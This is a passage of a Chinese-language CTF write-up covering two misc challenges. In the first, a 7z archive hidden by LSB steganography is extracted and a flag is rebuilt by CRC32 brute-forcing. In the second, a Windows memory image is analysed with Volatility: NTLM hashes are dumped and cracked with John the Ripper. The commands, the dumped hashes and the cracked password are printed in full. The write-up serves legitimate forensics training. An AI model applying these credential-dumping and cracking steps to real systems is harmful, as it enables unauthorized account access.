1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>root@kali:~/Desktop# zsteg flag.png</div><div>imagedata           .. text: &quot;xxxttt100&quot;</div><div>b1,r,lsb,xy         .. text: &quot;fiB5Q$ $&quot;</div><div><font color="#FF0000">b1,rgb,lsb,xy       .. file: 7-zip archive data, version 0.4</font></div><div>b1,bgr,lsb,xy       .. file: PGP Secret Key -</div><div>b2,g,msb,xy         .. text: &quot;pDuU$sAPP&quot;</div><div>b4,r,lsb,xy         .. text: &quot;gfU2DE\&quot;2Vt \&quot;Th&quot;</div><div>b4,g,lsb,xy         .. text: &quot;gvgwtT\&quot;\&quot;32EEUUvx&quot;</div><div>b4,b,lsb,xy         .. text: &quot;vvwdTT\&quot;\&quot;\&quot;\&quot;UUTDDf&quot;</div><div>b4,rgb,msb,xy       .. text: &quot;@7P5ac6aW&quot;</div><div>b4,bgr,msb,xy       .. text: &quot;6GU`1fc1QW&quot;</div></div><div>LSB隐写了一个7z格式压缩包，将其提取出来：</div><div><img src="BMZCTF Misc 4（25-32）_files/Image [16].png" type="image/png" data-filename="Image.png"/></div><div>其中包含6个3字节的txt文本文件，进行CRC32碰撞：</div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>import binascii, string, itertools</div><div><br/></div><div>dic = string.printable</div><div>crc = ['40E61BE5', '91C7B4A0', 'F4FD5E1C', '02658101', '92D786FD', '03B3EA6A']</div><div><br/></div><div>for i in itertools.product(dic, repeat=3):</div><div>    s = ''.join(i)</div><div>    crc32 = hex(binascii.crc32(s.encode())).upper()[2:].zfill(8)</div><div>    if crc32 in crc:</div><div>        print(s, crc32)</div></div><div>输出结果：</div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>2/2 02658101</div><div>333 92D786FD</div><div>33} 03B3EA6A</div><div>fla 40E61BE5</div><div>g{C 91C7B4A0</div><div>RC3 F4FD5E1C</div></div><div>拼接得到flag。或者换个写法：</div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>import binascii, string, itertools</div><div><br/></div><div>dic = string.printable</div><div>crc = ['40E61BE5', '91C7B4A0', 'F4FD5E1C', '02658101', '92D786FD', '03B3EA6A']</div><div><br/></div><div>def CRCcrack(c):</div><div>    for i in itertools.product(dic, repeat=3):</div><div>        s = ''.join(i)</div><div>        crc32 = hex(binascii.crc32(s.encode())).upper()[2:].zfill(8)</div><div>        if crc32 == c:</div><div>            return(s)</div><div><br/></div><div>for i in crc:</div><div>    print(CRCcrack(i), end='')</div></div><div>运行得到flag。</div><div><br/></div><div>flag：flag{CRC32/233333}</div><div><br/></div><div><b>32 memory</b></div><div>题目：分析内存镜像,破解管理员的登录密码,flag为明文密码的MD5值</div><div><br/></div><div>下载得到无扩展名的memory文件，题目已经提示是内存镜像，直接上volatility：</div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>root@kali:~/Desktop# volatility imageinfo -f memory</div><div>Volatility Foundation Volatility Framework 2.6</div><div>INFO    : volatility.debug    : Determining profile based on KDBG search...</div><div>          Suggested Profile(s) : WinXPSP2x86, WinXPSP3x86 (Instantiated with WinXPSP2x86)</div><div>                     AS Layer1 : IA32PagedMemoryPae (Kernel AS)</div><div>                     AS Layer2 : FileAddressSpace (/root/Desktop/memory)</div><div>                      PAE type : PAE</div><div>                           DTB : 0xad6000L</div><div>                          KDBG : 0x80546ae0L</div><div>          Number of Processors : 1</div><div>     Image Type (Service Pack) : 3</div><div>                KPCR for CPU 0 : 0xffdff000L</div><div>             KUSER_SHARED_DATA : 0xffdf0000L</div><div>           Image date and time : 2019-01-16 03:19:05 UTC+0000</div><div>     Image local date and time : 2019-01-16 11:19:05 +0800</div></div><div>尝试mimikatz插件没有结果，老老实实把hash给dump出来：</div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>root@kali:~/Desktop# volatility hashdump -f memory --profile=WinXPSP2x86 &gt; hash</div></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>Administrator:500:0182bd0bd4444bf867cd839bf040d93b:c22b315c040ae6e0efee3518d830362b:::</div><div>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</div><div>HelpAssistant:1000:132893a93031a4d2c70b0ba3fd87654a:fe572c566816ef495f84fdca382fd8bb:::</div></div><div>然后john爆破：</div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>root@kali:~/Desktop# john hash --format=NT</div><div>Using default input encoding: UTF-8</div><div>Loaded 3 password hashes with no different salts (NT [MD4 128/128 AVX 4x3])</div><div>Warning: no OpenMP support for this hash type, consider --fork=4</div><div>Proceeding with single, rules:Single</div><div>Press 'q' or Ctrl-C to abort, almost any other key for status</div><div>Warning: Only 3 candidates buffered for the current salt, minimum 12 needed for performance.</div><div>Warning: Only 11 candidates buffered for the current salt, minimum 12 needed for performance.</div><div>Almost done: Processing the remaining buffered candidate passwords, if any.</div><div>Warning: Only 2 candidates buffered for the current salt, minimum 12 needed for performance.</div><div>Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist</div><div><font color="#FF0000">123456789        (Administrator)</font></div><div>                 (Guest)</div></div><div>得到密码为123456789，计算MD5后包裹flag格式得到flag。</div><div><br/></div><div>flag：flag{25f9e794323b453885f5181f1b624d0b}</div></span>
</div></body></html> 